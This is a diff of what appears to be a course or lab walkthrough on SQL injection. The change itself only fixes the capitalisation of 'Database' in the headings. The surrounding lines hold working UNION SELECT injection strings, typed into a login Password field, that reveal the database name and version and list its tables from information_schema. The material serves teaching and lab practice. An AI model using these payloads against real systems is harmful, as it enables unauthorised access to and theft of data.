@@ -44,12 +44,12 @@ Type the following command in `Password`
 ```
 The last command will give you an error. Therefore, there are 4 columns in the table.
 
-##### 2. Use the following command to get the `DataBase Name`
+##### 2. Use the following command to get the `Database Name`
 ```
 ' UNION SELECT NULL,NULL,NULL,DATABASE(); -- 
 ```
 
-##### 3. Use the following command to get the `DataBase Version`
+##### 3. Use the following command to get the `Database Version`
 ```
 ' UNION SELECT NULL,NULL,NULL,version(); -- 
 ```
@@ -58,7 +58,7 @@ Or use the following alternative command
 ' UNION SELECT NULL,NULL,NULL,@@version; -- 
 ```
 
-##### 4. Use the following command to get all `Table` in the DataBase
+##### 4. Use the following command to get all `Table` in the Database
 ```
 ' UNION SELECT NULL,NULL,NULL,GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='proj2_inject3'; --
 ```
